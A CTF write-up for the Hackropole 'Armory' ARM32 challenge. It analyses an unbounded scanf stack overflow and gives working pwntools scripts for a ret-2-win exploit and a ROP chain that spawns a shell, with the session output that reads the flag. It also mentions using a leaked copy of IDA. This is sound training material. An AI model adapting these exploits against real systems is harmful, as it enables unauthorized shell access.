+++
title = "PWN: Basic ARM Stack Buffer Overflow"
date = "2024-10-29T15:17:22+01:00"
author = "yocvito"
authorTwitter = "yocvito" #do not include @
cover = ""
tags = ["write-up", "pwn", "ret-2-win", "arm", "linux"]
keywords = ["write-up", "pwn", "ret-2-win", "arm", "linux"]
description = "A basic binary exploitation challenge on ARM"
showFullContent = false
readingTime = false
hideComments = false
toc = true
+++

# PWN: Hackropole - Armory

This is challenge for training basic buffer overflows on ARM architecture. It was found on the [Hackropole](https://hackropole.fr/fr/challenges/pwn/fcsc2019-pwn-armory/) website.

## Challenge Description

You have a docker container running the challenge binary on `localhost:4000`.

When you connect to it with a network utility like `socat`, you can see it ask for an input name and then display an hello message.

```bash
$ socat tcp:localhost:4000 -
Hello, what's your name?
user
Hello user!
```

The binary running is an ARM32 ELF executable.

```bash
$ file armory
armory: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=aaa2d5ba6d3a6cf3958eb9073e673795c2f1e24e, not stripped
```

We can look at the binary protections with `checksec` from `pwntools` suite.

```bash
$ checksec armory
[*] '/path/to/armory'
    Arch:       arm-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
    Stripped:   No
```

The binary has not actual protection other than `NX` or `RELRO`, meaning we cannot perform shellcode injection nor GOT overwrite.

## Analysis

We analyze the binary with IDA Pro (I'm using the IDA 9 leak you can find on internet archive).

The `main` function is quite simple, it reads a name from the user and then prints a message.

![main function](/img/pwn-hackropole_armory/main.png)

The `scanf` call on line 7 doesn't bound the size of the retrieved input, allowing the user to inject more bytes than the `input` buffer can hold. Causing a buffer overflow and potentially allowing to execute arbitrary code.

> It could have been avoided by using `scanf("%63s", input)` which limit the number of written bytes.

In order to exploit this code, we want to redirect the program execution and spawn a shell. To do so, we need to control the return address of the function and make it point to malicious code. 

When the `main` function returns, the `LR` register will contains our own crafted address, eventually executing attacker controlled code.

 As we cannot directly inject shellcode, the idea is to either find a function in the binary that can be control to spawn a shell or use a **ROPChain** to call `system("/bin/sh")`. 

Luckily, the binary contains an `evil` function spawning a shell. We know the binary hasn't `PIE` enabled, thus we can directly call this function without needing a leak from the program.

![evil function](/img/pwn-hackropole_armory/evil.png)

## Exploitation

We have found a vulnerability in the binary and now we want to exploit it. We already have unveiled the `evil` function that spawns a shell and will craft an exploit to call it.

We first need to find the offset between the `input` buffer start and the return address. In the disassembly view above, we can look at the function prologue to discover this.

The function is pushing `FP` and `LR` registers on the stack and then allocates 0x40 (64) bytes. Thus the offset from `input` to `LR` is 0x44 (68).

> Remember order of `PUSH` instruction when loading mutliple values onto the stack. The most significant register (right) is pushed first.

**Stack Layout of main:**
```plaintext
0xffff:   LR            <-- FP
0xfffb:   FP    
0xfff8:   input[60:64]
...
0xffbb:   input[0:4]    <-- SP
```

We can now craft the exploit code for interacting with the binary. We will use `pwntools` to connect to the remote port, craft and send the payload.

```python
#!/usr/bin/env python3

from pwn import *
import argparse

evil_ea = 0x0001052c

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="The host to connect to")
    parser.add_argument("port", help="The port to connect to")
    args = parser.parse_args()

    r = remote(args.host, args.port)

    r.sendline(b"A" * 0x44 + p32(evil_ea))

    r.interactive()
```

By running the exploit script, we can see the exploitation was successful.

```bash
python3 exploit.py localhost 4000
[+] Opening connection to localhost on port 4000: Done
[*] Switching to interactive mode
Hello, what's your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,\x05\x01!
$ whoami
ctf
$ ls -la
total 28
drwxr-xr-x 1 root root 4096 Nov 29  2023 .
drwxr-xr-x 1 root root 4096 Oct 13 07:52 ..
-r-x------ 1 ctf  ctf  8316 Apr 30  2023 armory
-r-------- 1 ctf  ctf    47 Apr 30  2023 flag
-r-x------ 1 ctf  ctf    56 Apr 30  2023 run.sh
$ cat flag
ECSC{__REDACTED__}
$
```


We are now very happy to got it work, but we did not really improved our ARM skills here...
Thus we will try to exploit it using ROP to mess a bit more with ARM exploitation.

### ROPChain based exploit

What we need is to contruct a ROPChain (look at [this](http://phrack.org/issues/58/4.html#article) if you don't know about ROPs). The binary isn't designed to be exploited using ROP thus the CTF author didn't put specific gadgets in the binary. It will be a bit more difficult to chain gadgets for calling `system("/bin/dash")`.

In order to call a function using **ret-2-libc**, we need to set up the CPU registers as if the function was called normally, and finally return to the function.

Our target function is `system` which takes 1 argument, a pointer to a string representing the command to run. In ARM32, arguments are passed through registers `R0-R3`  and then onto the stack. So if we can set the `R0` register to the address of the string `/bin/dash` and then makes `LR` points to the `system` function, we can spawn a shell.

Our ROPChain should look like:
```plaintext
+0:   @pop_r0_lr   <-- LR (when returning from main)
+4:   @bin_sh
+8:   @system
```

#### Finding relevant gadgets

We can enumerate the binary gadgets using `ROPgadget` (output has been reduced for clarity):
```bash
$ ROPgadget --binary=armory
Gadgets information
============================================================
0x00010530 : add fp, sp, #4 ; ldr r3, [pc, #0x18] ; add r3, pc, r3 ; mov r0, r3 ; bl #0x103cc ; mov r0, r0 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr
0x0001049c : add r1, r1, r1, lsr #31 ; asrs r1, r1, #1 ; bxeq lr ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; bxeq lr ; bx r3
...
0x00010380 : pop {r3, lr} ; bx lr
...
0x000105b8 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr
...
0x00010464 : sub r3, r3, r0 ; cmp r3, #6 ; bxls lr ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; bxeq lr ; bx r3
0x00010548 : sub sp, fp, #4 ; pop {fp, lr} ; bx lr

Unique gadgets found: 94
```

There is no obvious gadgets for setting up `r0` to what we want. We can eventually branch `0x00010380 : pop {r3, lr} ; bx lr` with `0x000105b8 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr` but `sp` is modified and thus, the stack layout will be undefined, making our exploit potentially fail.

What we can still do to demonstrate ROP on ARM is, using the gadget that call `system` in the `evil` function, discard the loading of the `"/bin/dash"` string into `r3` and use the gadget at `0x10380` to load it manually with ROP.

![evil function dissasembly](/img/pwn-hackropole_armory/evil-disass.png)

Our ROPChain will then look like:
```plaintext
+0: 0x00010380  ; @g_mov_r0_r3
+4: 0x00010650  ; @/bin/dash (retrieved in IDA)
+8: 0x0001053C  ; @evil_system_stub
```

> One thing to notice is that `scanf` doesn't abort on `\x00` and allows us to write zeroes in the middle of our ROPchain. We can see in scanf documentation that "The input string stops at white space or at the maximum field width, whichever occurs first."


We can modify our exploit script to handle the simple and rop-based exploits:
```python
#!/usr/bin/env python3

from pwn import *
import argparse

evil_ea = 0x0001052c

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subcommands = parser.add_subparsers(dest="subcommand")

    simple_parser = subcommands.add_parser("simple")
    rop_parser = subcommands.add_parser("rop")

    rop_parser.add_argument("-b", "--binary", help="The binary to exploit and retrieve gadgets from")

    parser.add_argument("host", help="The host to connect to")
    parser.add_argument("port", help="The port to connect to")
    args = parser.parse_args()

    if args.subcommand == "simple":
        print("Exploiting with RET-2-WIN")
        payload = b"A" * 0x44 + p32(evil_ea)
    elif args.subcommand == "rop":
        print("Exploiting with ROP")
        bin = ELF(args.binary)
        binsh_ea = next(bin.search(b"/bin/dash\x00"))
        g_evil_system_stub = 0x0001053C # 0x0001053c : mov r0, r3 ; bl #0x103cc ; mov r0, r0 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr
        g_mov_r0_r3 = 0x00010380 # 0x0001037c : pop {r3, lr} ; bx lr 

        payload = b"A" * 0x44
        payload += p32(g_mov_r0_r3)
        payload += p32(binsh_ea)
        payload += p32(g_evil_system_stub)
    else:
        parser.print_help()
        sys.exit(1)

    r = remote(args.host, args.port)

    print(payload)

    r.sendline(payload)

    r.interactive()
```

Then we can exploit the remote service using ROP !
```bash
python3 exploit.py rop  -b ./armory localhost 4000
Exploiting with ROP
[*] '/path/to/armory'
    Arch:       arm-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
    Stripped:   No
[+] Opening connection to localhost on port 4000: Done
[*] Switching to interactive mode
Hello, what's your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\x03\x01!
$ cat flag
ECSC{__REDACTED__}
```

One remaining issue is that we cannot call `exit` or `abort` at the end of our exploit because the last gadget is making the program crash by branching to an invalid address.
